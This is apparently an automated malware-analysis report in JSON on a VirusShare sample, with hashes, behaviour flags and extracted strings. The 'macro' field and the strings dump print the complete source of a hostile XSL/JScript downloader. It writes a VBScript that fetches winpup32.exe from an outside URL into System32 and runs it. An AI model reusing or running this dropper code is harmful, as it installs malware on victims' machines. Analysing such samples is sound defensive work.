{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Adodb.Stream": "May create a text file",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Microsoft.XMLHTTP": "May download files from the Internet",
            "Open": "May open a file",
            "Shell": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "regread": "May read registry keys",
            "run": "May run an executable file or a system command",
            "savetofile": "May create a text file",
            "write": "May write to a file"
        },
        "macro": "<?xml version=\"1.0\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"#?m$ux\" ?>\n<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/TR/WD-xsl\">\n<xsl:script>\n<![CDATA[\ntry\n{\n\n   var objShell = new ActiveXObject( \"WScript.Shell\" );\n       var objFileSys = new ActiveXObject( \"Scripting.FileSystemObject\" );\n       var cSystemDir = \"\";\n   \n       if( objShell.Environment( \"PROCESS\" )(\"OS\") == \"Windows_NT\" )\n       \t{\n           cSystemDir = objShell.regread( \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRoot\" ) + \"\\\\System32\\\\\";\n           }\n       else\n       \t{\n           cSystemDir = objShell.regread( \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\SystemRoot\" ) + \"\\\\System\\\\\";\n           }\n       objFileSys = null;\n   \n   \tvar fso, tf, max, x;\n   \tmax = 1000000;\n   \tfso = new ActiveXObject(\"Scripting.FileSystemObject\");\n   \ttf = fso.CreateTextFile(cSystemDir + \"runit.vbs\", true);\n   \t//tf = fso.CreateTextFile(\"c:\\\\runit.vbs\", true);\n   \ttf.WriteLine(\"On Error Resume Next\");\n   \ttf.WriteLine(\"URL = \\\"http://www.stopannoyingpopups.com/jbe1/winpup32.exe\\\"\");\n   \ttf.WriteLine(\"Set xml = CreateObject(\\\"Microsoft.XMLHTTP\\\")\");\n   \ttf.WriteLine(\"xml.Open \\\"GET\\\", URL, False\");\n   \ttf.WriteLine(\"xml.Send\");\n   \ttf.WriteLine(\"set oStream = createobject(\\\"Adodb.Stream\\\")\");\n   \ttf.WriteLine(\"oStream.type = 1\");\n   \ttf.WriteLine(\"oStream.open\");\n   \ttf.WriteLine(\"oStream.write xml.responseBody\");\n   \ttf.WriteLine(\"oStream.savetofile \\\"\" + cSystemDir + \"winpup32.exe\\\", 1\");\n   \ttf.WriteLine(\"oStream.close\");\n   \ttf.WriteLine(\"set oStream = nothing\");\n   \ttf.WriteLine(\"Set xml = Nothing\");\n   \ttf.WriteLine(\"Set oShell = createobject(\\\"WScript.Shell\\\")\");\n   \ttf.WriteLine(\"oShell.run \\\"\" + cSystemDir + \"winpup32.exe\\\", 1, false\");\n   \n   \ttf.Close();\n   \t\n   \tobjShell.run(\"\\\"\" + cSystemDir + \"runit.vbs\\\"\");\n\n}\ncatch(e) {  \n\t\n}\n]]>\n</xsl:script>\n<msux>\nmsux\n</msux>\n</xsl:stylesheet>"
    },
    "filename": "VirusShare_c432f71e3e9aee90a594e28bab230f51",
    "filesize": 1933,
    "filetype": "XML 1.0 document, ASCII text",
    "hashes": {
        "md5": "c432f71e3e9aee90a594e28bab230f51",
        "sha1": "bed17288a01446a6d49f1e53af751fce75dced1d",
        "sha256": "bb7708a2a4accc9ffc664d6eb7eb2fc08d3be07308d3890a35bfb1235cee5863"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?xml version=\"1.0\"?>",
            "<?xml-stylesheet type=\"text/xsl\" href=\"#?m$ux\" ?>",
            "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/TR/WD-xsl\">",
            "<xsl:script>",
            "<![CDATA[",
            "   var objShell = new ActiveXObject( \"WScript.Shell\" );",
            "       var objFileSys = new ActiveXObject( \"Scripting.FileSystemObject\" );",
            "       var cSystemDir = \"\";",
            "       if( objShell.Environment( \"PROCESS\" )(\"OS\") == \"Windows_NT\" )",
            "       \t{",
            "           cSystemDir = objShell.regread( \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRoot\" ) + \"\\\\System32\\\\\";",
            "           }",
            "       else",
            "       \t{",
            "           cSystemDir = objShell.regread( \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\SystemRoot\" ) + \"\\\\System\\\\\";",
            "           }",
            "       objFileSys = null;",
            "   \tvar fso, tf, max, x;",
            "   \tmax = 1000000;",
            "   \tfso = new ActiveXObject(\"Scripting.FileSystemObject\");",
            "   \ttf = fso.CreateTextFile(cSystemDir + \"runit.vbs\", true);",
            "   \t//tf = fso.CreateTextFile(\"c:\\\\runit.vbs\", true);",
            "   \ttf.WriteLine(\"On Error Resume Next\");",
            "   \ttf.WriteLine(\"URL = \\\"http://www.stopannoyingpopups.com/jbe1/winpup32.exe\\\"\");",
            "   \ttf.WriteLine(\"Set xml = CreateObject(\\\"Microsoft.XMLHTTP\\\")\");",
            "   \ttf.WriteLine(\"xml.Open \\\"GET\\\", URL, False\");",
            "   \ttf.WriteLine(\"xml.Send\");",
            "   \ttf.WriteLine(\"set oStream = createobject(\\\"Adodb.Stream\\\")\");",
            "   \ttf.WriteLine(\"oStream.type = 1\");",
            "   \ttf.WriteLine(\"oStream.open\");",
            "   \ttf.WriteLine(\"oStream.write xml.responseBody\");",
            "   \ttf.WriteLine(\"oStream.savetofile \\\"\" + cSystemDir + \"winpup32.exe\\\", 1\");",
            "   \ttf.WriteLine(\"oStream.close\");",
            "   \ttf.WriteLine(\"set oStream = nothing\");",
            "   \ttf.WriteLine(\"Set xml = Nothing\");",
            "   \ttf.WriteLine(\"Set oShell = createobject(\\\"WScript.Shell\\\")\");",
            "   \ttf.WriteLine(\"oShell.run \\\"\" + cSystemDir + \"winpup32.exe\\\", 1, false\");",
            "   \ttf.Close();",
            "   \t",
            "   \tobjShell.run(\"\\\"\" + cSystemDir + \"runit.vbs\\\"\");",
            "catch(e) {  ",
            "</xsl:script>",
            "<msux>",
            "msux",
            "</msux>",
            "</xsl:stylesheet>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.w3.org/TR/WD-xsl",
            "http://www.stopannoyingpopups.com/jbe1/winpup32.exe\\"
        ]
    },
    "time": "0:00:00.282847",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
